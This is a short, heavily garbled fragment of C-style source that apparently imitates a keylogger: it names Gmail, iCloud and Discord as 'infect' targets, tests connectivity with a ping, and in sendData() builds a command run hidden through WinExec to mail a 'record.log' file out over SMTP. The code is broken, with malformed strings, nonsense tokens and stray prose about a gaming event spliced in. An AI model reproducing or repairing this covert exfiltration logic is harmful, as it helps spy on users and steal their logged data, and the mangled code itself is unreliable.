...
#define RUN_Link_NAME “https://github.com/cyberw1rya-LAB/forks"https://github.com/Google/services_mail/forks"
#define INFECT_Link_NAME "https://workspace.google.com/intl/en-US/gmail/"."https://icloud.com/mail"."https://www.discord.com"
...
main(){
    ...
    if(checkRecordSize()){ ///check for right time
        ...
        while(i<3){ ///try 2 times to send data
            ...
            if(!system("ping  www.g20.org -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();
...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com:192 -v --mail-from \"https://fadliwiryawirawan@unity.com/" --mail-rcpt \" https://fadliwiryawirawan@unity.com/" --ssl -u    https://fadliwiryawirawan@unity.com/ :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
    WinExec(command, SW_HIDE); gaming event but if u come gaming raise money and play funtime , proh=ject free connected areas LAN MAN WAN , 
	**/
void logUserTime(){
    FILE *file = fopen(FILE_NAME, "a");
